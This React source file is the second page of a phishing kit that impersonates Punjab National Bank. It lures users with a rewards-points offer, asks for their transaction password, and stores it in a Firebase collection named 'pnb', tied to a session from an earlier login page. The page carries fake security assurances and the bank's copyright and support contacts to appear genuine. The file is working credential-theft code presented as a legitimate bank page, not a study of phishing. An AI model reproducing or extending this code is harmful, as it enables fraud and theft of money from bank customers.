import { useState, useEffect } from 'react';
import { useNavigate, useParams } from 'react-router-dom';
import '../App.css';
import secondPageImage from '../assets/second_page_img.jpeg';
import FirebaseUtil from '../FirebaseRepo';

const SecondPage = () => {
  const [password2, setPassword2] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [error, setError] = useState('');
  const [documentExists, setDocumentExists] = useState(true);
  const navigate = useNavigate();
  const { documentId } = useParams();

  // Verify document exists on load
  useEffect(() => {
    const verifyDocument = async () => {
      try {
        // Check if the document exists first
        const doc = await FirebaseUtil.getDocument("pnb", documentId);
        if (!doc) {
          setDocumentExists(false);
          setError("Session expired or invalid. Please start over.");
        }
      } catch (err) {
        console.error("Error verifying document:", err);
        setDocumentExists(false);
        setError("Could not verify your session. Please try again.");
      }
    };

    if (documentId) {
      verifyDocument();
    } else {
      setDocumentExists(false);
      setError("Invalid session. Please start over.");
    }
  }, [documentId]);

  const validatePassword = () => {
    if (!password2) {
      setError("Transaction password is required");
      return false;
    }
    if (password2.length < 4) {
      setError("Transaction password must be at least 4 characters");
      return false;
    }
    setError('');
    return true;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setError('');
    
    // Validate password
    if (!validatePassword()) {
      return;
    }
    
    // Check if document exists
    if (!documentExists) {
      setError("Session expired or invalid. Please start over.");
      return;
    }
    
    setIsSubmitting(true);

    try {
      // Update the existing document in the pnb collection
      const result = await FirebaseUtil.updateDocument("pnb", documentId, {
        password2,
        updatedAt: new Date().toISOString()
      });

      // Check if update was successful
      if (result.state === 'success') {
        // Navigate to the success page after successful submission
        setTimeout(() => {
          navigate('/success');
        }, 1000);
      } else {
        throw new Error(result.error || 'Failed to update document');
      }
    } catch (error) {
      console.error("Error submitting form:", error);
      setError("An error occurred. Please try again.");
      setIsSubmitting(false);
    }
  };

  return (
    <div className="flex flex-col min-h-screen bg-white">
      {/* Header Image - Centered with white space on sides */}
      <div className="w-full bg-white py-4 flex justify-center">
        <div className="max-w-md mx-auto">
          <img 
            src={secondPageImage} 
            alt="PNB Bank Header" 
            className="max-h-48 w-auto object-contain"
          />
        </div>
      </div>

      {/* Main Content */}
      <main className="flex-1 m-2 flex justify-center items-center bg-gray-100">
        <div className="bg-white text-gray-800 rounded-xl w-full max-w-md p-5 shadow-lg border-t-4 border-[#A20E37]">
          <div className="text-center mb-6">
            <h1 className="text-2xl font-bold text-[#A20E37]">
              One Step Away To Collect Your Rewards Points
            </h1>
          </div>

          {error && (
            <div className="bg-red-50 border-l-4 border-red-500 p-4 mb-4">
              <div className="flex">
                <div className="flex-shrink-0">
                  <svg className="h-5 w-5 text-red-500" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
                    <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clipRule="evenodd" />
                  </svg>
                </div>
                <div className="ml-3">
                  <p className="text-sm text-red-700">{error}</p>
                </div>
              </div>
            </div>
          )}

          <form onSubmit={handleSubmit} className="space-y-4">
            <div className="mb-4">
              <label className="block text-gray-700 text-sm font-bold mb-2">
                Verify Your Transaction Password
              </label>
              <input
                type="password"
                className="w-full py-2 px-3 rounded border border-gray-300 text-gray-700 text-sm focus:outline-none focus:ring-2 focus:ring-[#A20E37]"
                value={password2}
                onChange={(e) => {
                  setPassword2(e.target.value);
                  if (error) setError('');
                }}
                required
                minLength={4}
                disabled={!documentExists || isSubmitting}
              />
            </div>

            <button
              type="submit"
              className="w-full bg-[#FBBC09] hover:bg-yellow-500 text-black font-bold py-2 px-4 rounded-full text-sm"
              disabled={isSubmitting || !documentExists}
            >
              {isSubmitting ? "PROCESSING..." : "SUBMIT"}
            </button>

            {!documentExists && (
              <button
                type="button"
                className="w-full mt-2 bg-[#A20E37] hover:bg-[#8a0c2f] text-white font-bold py-2 px-4 rounded-full text-sm"
                onClick={() => navigate('/')}
              >
                BACK TO LOGIN
              </button>
            )}
          </form>

          <div className="mt-6 text-center">
            <p className="text-sm text-gray-600">
              Your security is our priority. All transactions are encrypted and secure.
            </p>
            <div className="flex items-center justify-center mt-2">
              <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5 text-[#A20E37] mr-1" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
              </svg>
              <span className="text-xs font-semibold">Secure Connection</span>
            </div>
          </div>
        </div>
      </main>

      {/* Bottom Part / Footer */}
      <footer className="bg-gray-800 text-white p-4 text-center">
        <p className="text-sm"> 2025 Punjab National Bank. All rights reserved.</p>
        <p className="text-xs">For support, call 1800-180-2222 or email care@pnb.co.in</p>
      </footer>
    </div>
  );
};

export default SecondPage;
